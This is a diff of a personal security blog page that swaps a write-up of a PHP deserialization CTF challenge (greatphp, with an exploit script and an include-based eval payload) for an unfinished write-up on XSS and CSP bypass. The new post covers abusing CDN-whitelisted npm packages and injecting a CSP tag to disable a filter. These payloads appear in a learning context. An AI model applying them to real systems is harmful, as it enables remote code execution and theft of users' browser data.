@@ -10,23 +10,25 @@
     <meta name="copyright" content="温柔刀">
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     <meta name="description" content="">
-    <meta name="description" content="Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp12345678910111213141516171819202122232425&lt;?php  error_reporting(0);class SYCLOVER &#123;  public $syc;  public $lover;  public function __wakeup()&amp;">
+    <meta name="description" content="因为共同点很多所以把两道题串联起来一起记。 基础知识“XSS 全称 Cross Site Scripting (因为简称与 CSS 同名，所以改成了 XSS)，即跨站脚本攻击，简单来说就是可以在网站页面上执行任意的 JavaScript 代码，进而盗取用户的 Cookie, localStorage 等信息” 沉睡的 Bot这两道题目的共同点——同时也是 XSS 的特征之一，就是有一个  初始化就">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp">
-<meta property="og:url" content="http://example.com/2025/07/26/Exception-Error-%E7%B1%BB%E7%BB%95%E8%BF%87md5%E3%80%81sha1%E2%80%94%E2%80%94-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp/index.html">
+<meta property="og:title" content="(写了一半)XSS+CSP——0xgame2024paste_bin与RCTF2025author">
+<meta property="og:url" content="http://example.com/2025/12/01/[%E5%86%99%E4%BA%86%E4%B8%80%E5%8D%8A]XSS+CSP%E2%80%94%E2%80%940xgame2024paste_bin%E4%B8%8ERCTF2025author/index.html">
 <meta property="og:site_name" content="三重门">
-<meta property="og:description" content="Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp12345678910111213141516171819202122232425&lt;?php  error_reporting(0);class SYCLOVER &#123;  public $syc;  public $lover;  public function __wakeup()&amp;">
+<meta property="og:description" content="因为共同点很多所以把两道题串联起来一起记。 基础知识“XSS 全称 Cross Site Scripting (因为简称与 CSS 同名，所以改成了 XSS)，即跨站脚本攻击，简单来说就是可以在网站页面上执行任意的 JavaScript 代码，进而盗取用户的 Cookie, localStorage 等信息” 沉睡的 Bot这两道题目的共同点——同时也是 XSS 的特征之一，就是有一个  初始化就">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-07-26T01:39:44.000Z">
-<meta property="article:modified_time" content="2025-07-26T04:41:53.853Z">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1764599531280-2d7d7b0e-e5ae-429e-9f6a-94f0b9befddd.png">
+<meta property="article:published_time" content="2025-12-01T14:34:22.000Z">
+<meta property="article:modified_time" content="2025-12-01T14:35:34.967Z">
 <meta property="article:author" content="温柔刀">
-<meta property="article:tag" content="PHP原生类">
-<meta property="article:tag" content="wp">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="CSP">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2025/png/55662681/1764599531280-2d7d7b0e-e5ae-429e-9f6a-94f0b9befddd.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
-    <title>Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp · Gentle_knife&#39;s Studio</title>
+    <title>(写了一半)XSS+CSP——0xgame2024paste_bin与RCTF2025author · Gentle_knife&#39;s Studio</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -244,7 +246,7 @@
             <a href="/">Gentle_knife&#39;s Studio.</a>
         </div>
         <div class="post-title header-element">
-            <a href="#" class="post-name">Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp</a>
+            <a href="#" class="post-name">(写了一半)XSS+CSP——0xgame2024paste_bin与RCTF2025author</a>
         </div>
     </div>
 </header>
@@ -271,7 +273,7 @@
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-                Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp
+                (写了一半)XSS+CSP——0xgame2024paste_bin与RCTF2025author
             <!-- 404 -->
         </h1>
         <!-- 副标题 -->
@@ -283,18 +285,18 @@
             <div class="post-intros">
                 <!-- 文章页标签  -->
                     <div class="post-intro-tags" >
-        <a class="post-tag" href="javascript:void(0);" data-tags="PHP原生类">PHP原生类</a>
-        <a class="post-tag" href="javascript:void(0);" data-tags="wp">wp</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="XSS">XSS</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="CSP">CSP</a>
 </div>
 
                 <!-- 文章字数统计 -->
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">909</span>Reading time: <span class="post-count reading-time">3 min</span></span>
+                        <span>Word count: <span class="post-count word-count">584</span>Reading time: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
                     <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2025/07/26</span>
+                    <span class="post-intro-time">2025/12/01</span>
                     <!-- busuanzi -->
                         <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                             <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
@@ -446,70 +448,49 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h1 id="Exception-Error-类绕过md5、sha1——-极客大挑战-2020-greatphp"><a href="#Exception-Error-类绕过md5、sha1——-极客大挑战-2020-greatphp" class="headerlink" title="Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp"></a>Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">      <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+        <p>因为共同点很多所以把两道题串联起来一起记。</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>“XSS 全称 Cross Site Scripting (因为简称与 CSS 同名，所以改成了 XSS)，即跨站脚本攻击，简单来说就是可以在网站页面上执行任意的 JavaScript 代码，进而盗取用户的 Cookie, localStorage 等信息”</p>
+<h1 id="沉睡的-Bot"><a href="#沉睡的-Bot" class="headerlink" title="沉睡的 Bot"></a>沉睡的 Bot</h1><p><img src="https://cdn.nlark.com/yuque/0/2025/png/55662681/1764599531280-2d7d7b0e-e5ae-429e-9f6a-94f0b9befddd.png">这两道题目的共同点——同时也是 XSS 的特征之一，就是有一个</p>
+<ul>
+<li>初始化就能读取 flag</li>
+<li>会无条件点击攻击者给他发的链接，并且之后会沉睡一段时间，</li>
+<li>遵守同源策略，只能在题目给定的源中活动<br>的 <strong>Bot</strong>。</li>
+</ul>
+<p>这里 sleep 的用意是给攻击留出足够的时间，因为 CSP 绕过或者数据外带都需要加载。</p>
+<h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><p><a target="_blank" rel="noopener" href="https://aszx87410.github.io/beyond-xss/ch1/browser-security-model/">瀏覽器的安全模型 | Beyond XSS</a></p>
+<h2 id="基于信任域（CDN）的-CSP-绕过"><a href="#基于信任域（CDN）的-CSP-绕过" class="headerlink" title="基于信任域（CDN）的 CSP 绕过"></a>基于信任域（CDN）的 CSP 绕过</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">        <span class="attr">content</span>=<span class="string">&quot;base-uri &#x27;none&#x27;; style-src &#x27;unsafe-inline&#x27;; script-src &#x27;self&#x27; &#x27;sha256-mDsn/yxO0Kbxaggx7bFdeBmrC22U6cePGEUeeSwO+n0=&#x27; cdn.tailwindcss.com unpkg.com cdn.jsdelivr.net;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>看到两个强比较，以为是强碰撞，但是看到后面有过滤，还需要执行命令，不对，去原生类里面找。</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/p/15655736.html">[php安全]原生类的利用 - Aur0ra* - 博客园</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/284901">PHP原生类在安全方面的利用总结-安全KER - 安全资讯平台</a></p>
-<blockquote>
-<p>Error 和 Exception 因为有 tostring 魔术方法，将他们反序列化后只显 message 不显示错误代码，所以在同一行反序列化，md5 和 sha1 就可以绕过。</p>
-</blockquote>
-<p>Error 类是所有 PHP 内部错误类的基类，</p>
-<p>源码含有以下两行：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span> <span class="keyword">implements</span> <span class="built_in">Throwable</span> &#123;</span><br><span class="line">    <span class="comment">/* 属性 */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br></pre></td></tr></table></figure>
+<p>script-src :所有 <code>&lt;script&gt;</code> 标签的安全规则：</p>
+<ul>
+<li>‘self’:可以加载同源的 JS 文件。</li>
+<li>‘sha256-mDsn&#x2F;yxO0Kbxaggx7bFdeBmrC22U6cePGEUeeSwO+n0&#x3D;’可以：可以加载哈希值是指定值的脚本。</li>
+<li>cdn.tailwindcss.com unpkg.com cdn.jsdelivr.net ：<strong>只要 js 的地址是这两个开头</strong>的脚本可以加载。以这个开头的都是 CDN 服务，就是开发者发布的 npm 包都可以通过这两个网址加载。CDN 缓存的源头就是<a target="_blank" rel="noopener" href="https://www.npmjs.com/%EF%BC%8C%E8%80%8C%E8%BF%99%E4%B8%AA%E7%BD%91%E5%9D%80%E4%B8%8A%E7%9A%84">https://www.npmjs.com/，而这个网址上的</a> npm 包只要注册就可以发布。所以我们自己上传一个有毒的 npm 包把前缀改了就好了。<br>这里直接用官方 wp 里面的地址：<br>my-package-x1r0z:<a target="_blank" rel="noopener" href="https://www.npmjs.com/package/my-package-x1r0z">https://www.npmjs.com/package/my-package-x1r0z</a><br>其unpkg地址为：<a target="_blank" rel="noopener" href="https://unpkg.com/my-package-x1r0z@1.1.0/">UNPKG</a></li>
+</ul>
+<p>npm 包里面的 Js 具体内容是根据题目来写的：</p>
+<p>因为是LocalStorage 里，就写 <code>localStorage.getItem</code>。</p>
+<h2 id="利用-CSP-屏蔽-WAF-RCTF2025author"><a href="#利用-CSP-屏蔽-WAF-RCTF2025author" class="headerlink" title="利用 CSP 屏蔽 WAF-&gt;RCTF2025author"></a>利用 CSP 屏蔽 WAF-&gt;RCTF2025author</h2><p>这道题里面有一个几乎过滤了所有 XSS 的 js</p>
+<p>我们可以用 CSP 来以毒攻毒使这个超级强大的 js 失效，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;script-src-elem http://localhost:8081/assets/js/article.js;script-src unsafe-inline&#x27; http-equiv=&#x27;Content-Security-Policy&#x27;</span><br></pre></td></tr></table></figure>
 
-<p>message 是错误消息，code 是错误代码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
-
-<p>Exception 是所有异常的基类，关键部分同上。</p>
-<p>当我们 new 了 error 类，并 echo 了这个对象，触发类的 tostring 方法：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br></pre></td></tr></table></figure>
-
-<p><font style="color:rgb(51, 51, 51);">输出如下：</font></p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Error:</span> <span class="string">payload</span> <span class="string">in</span> <span class="string">/usercode/file.php:2</span></span><br><span class="line"><span class="attr">Stack trace:</span></span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>会打印 message,file 和Stack trace，并不会打印 code。也就是说只要在同一个文件里 message 相同，那么打印出来的字符串就会完全相同，自然而然 md5 值就相同。</p>
-<p>回到题目，因为 md5($a)&#x3D;md5(string($a))，可以触发类的 tosring 方法，所以我们可以让 code 不同，其他部分相同，来绕过这里的本身不同但是 md5 和 sha1 相同。</p>
-<p>了解了以上知识点，我们会写出以下脚本：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$answer</span> = <span class="keyword">new</span> SYCLOVER;</span><br><span class="line"><span class="variable">$answer</span> -&gt; lover = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;echo &quot;__DIR__:&quot; . __DIR__;&#x27;</span>,<span class="string">&quot;114514&quot;</span>);</span><br><span class="line"><span class="variable">$answer</span> -&gt; syc = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;echo &quot;__DIR__:&quot; . __DIR__;&#x27;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$answer</span>));</span><br></pre></td></tr></table></figure>
-
-<p>但是拿到输出结果，会发现并没有回显，因为 tostring 的结果是包含行号的，这里我们需要把两个赋值属性放在同一行。</p>
-<p>由于我们需要保证两个属性的 message 始终一致，还需要对 message 中的命令不断进行修改，所以较好的办法是提前赋值变量。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;?&gt;&lt;?= include $_GET[_]; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$payload</span>-&gt;lover = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$a</span>);<span class="variable">$payload</span>-&gt; syc = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$a</span>,<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>关于 payload 中<code>$a = &#39;?&gt;&lt;?= include $_GET[_]; ?&gt;&#39;;</code>的原因，在看了 wp 和追问了 ai 后，我的解释是：</p>
-<p>由于题目中的正则表达式过滤了<code>()</code>括号，而 PHP 中的函数调用需要括号，在不能写一句话木马之后，很自然的就想起 include。</p>
-<p>这里我将$a 换成 <code>echo 123;</code> 无回显，百思不得其解，其实一看就明白了。eval 里的是这样一个字符串：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span>: <span class="keyword">echo</span> <span class="number">123</span>; in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>eval 里面必须是合法的 php 代码，这样的显然是不合法的，只会报错，而题目里已经设置不显示报错信息了。</p>
-<p>因此我们要在字符串里面塞入一个自成一体的 php 脚本。这样 eval 里面就是：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span>: <span class="meta">?&gt;</span><span class="meta">&lt;?=</span> <span class="keyword">include</span> <span class="variable">$_GET</span>[_]; <span class="meta">?&gt;</span> in /usercode/file.php:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>这样我们就可以用 include 来召唤 flag 了。</p>
-<p>此处<code>?&gt;</code>是用来闭合的，经测试不写这个会报错unexpected ‘&lt;’.S</p>
+<h1 id="payload-出场率高的iframe"><a href="#payload-出场率高的iframe" class="headerlink" title="payload 出场率高的iframe"></a>payload 出场率高的iframe</h1><p><strong>Iframe (Inline Frame)</strong>，中文叫“<strong>内联框架</strong>”，能直接在浏览器里面再开一个窗口。</p>
 
     </article>
     <!-- license -->
         <div class="license-wrapper">
             <p>Author：<a href="http://example.com">温柔刀</a>
-            <p>Link：<a href="http://example.com/2025/07/26/Exception-Error-%E7%B1%BB%E7%BB%95%E8%BF%87md5%E3%80%81sha1%E2%80%94%E2%80%94-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp/">http://example.com/2025/07/26/Exception-Error-%E7%B1%BB%E7%BB%95%E8%BF%87md5%E3%80%81sha1%E2%80%94%E2%80%94-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp/</a>
-            <p>Publish date：<a href="http://example.com/2025/07/26/Exception-Error-%E7%B1%BB%E7%BB%95%E8%BF%87md5%E3%80%81sha1%E2%80%94%E2%80%94-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp/">July 26th 2025, 9:39:44 am</a>
-            <p>Update date：<a href="http://example.com/2025/07/26/Exception-Error-%E7%B1%BB%E7%BB%95%E8%BF%87md5%E3%80%81sha1%E2%80%94%E2%80%94-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp/">July 26th 2025, 12:41:53 pm</a>
+            <p>Link：<a href="http://example.com/2025/12/01/[%E5%86%99%E4%BA%86%E4%B8%80%E5%8D%8A]XSS+CSP%E2%80%94%E2%80%940xgame2024paste_bin%E4%B8%8ERCTF2025author/">http://example.com/2025/12/01/[%E5%86%99%E4%BA%86%E4%B8%80%E5%8D%8A]XSS+CSP%E2%80%94%E2%80%940xgame2024paste_bin%E4%B8%8ERCTF2025author/</a>
+            <p>Publish date：<a href="http://example.com/2025/12/01/[%E5%86%99%E4%BA%86%E4%B8%80%E5%8D%8A]XSS+CSP%E2%80%94%E2%80%940xgame2024paste_bin%E4%B8%8ERCTF2025author/">December 1st 2025, 10:34:22 pm</a>
+            <p>Update date：<a href="http://example.com/2025/12/01/[%E5%86%99%E4%BA%86%E4%B8%80%E5%8D%8A]XSS+CSP%E2%80%94%E2%80%940xgame2024paste_bin%E4%B8%8ERCTF2025author/">December 1st 2025, 10:35:34 pm</a>
             <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     <!-- paginator -->
     <ul class="post-paginator">
         <li class="next">
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2025/07/28/Java%E5%8F%8D%E5%B0%84%E5%92%8CCC%E9%93%BE/" title="Java反射和CC链">
-                    <div class="nextTitle">Java反射和CC链</div>
-                </a>
         </li>
         <li class="previous">
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2025/07/21/SSTI/" title="SSTI">
-                    <div class="prevTitle">SSTI</div>
+                <a href="/2025/10/27/vec%E6%9D%AF/" title="vec杯">
+                    <div class="prevTitle">vec杯</div>
                 </a>
         </li>
     </ul>
@@ -584,7 +565,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Exception-Error-%E7%B1%BB%E7%BB%95%E8%BF%87md5%E3%80%81sha1%E2%80%94%E2%80%94-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2020-greatphp"><span class="toc-number">1.</span> <span class="toc-text">Exception,Error 类绕过md5、sha1—— [极客大挑战 2020]greatphp</span></a></li></ol>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B2%89%E7%9D%A1%E7%9A%84-Bot"><span class="toc-number">2.</span> <span class="toc-text">沉睡的 Bot</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSP"><span class="toc-number">3.</span> <span class="toc-text">CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E4%BF%A1%E4%BB%BB%E5%9F%9F%EF%BC%88CDN%EF%BC%89%E7%9A%84-CSP-%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">基于信任域（CDN）的 CSP 绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-CSP-%E5%B1%8F%E8%94%BD-WAF-RCTF2025author"><span class="toc-number">3.2.</span> <span class="toc-text">利用 CSP 屏蔽 WAF-&gt;RCTF2025author</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#payload-%E5%87%BA%E5%9C%BA%E7%8E%87%E9%AB%98%E7%9A%84iframe"><span class="toc-number">4.</span> <span class="toc-text">payload 出场率高的iframe</span></a></li></ol>
             </div>
         <!-- sidebar -->
         <div class="sidebar sidebar-hide">
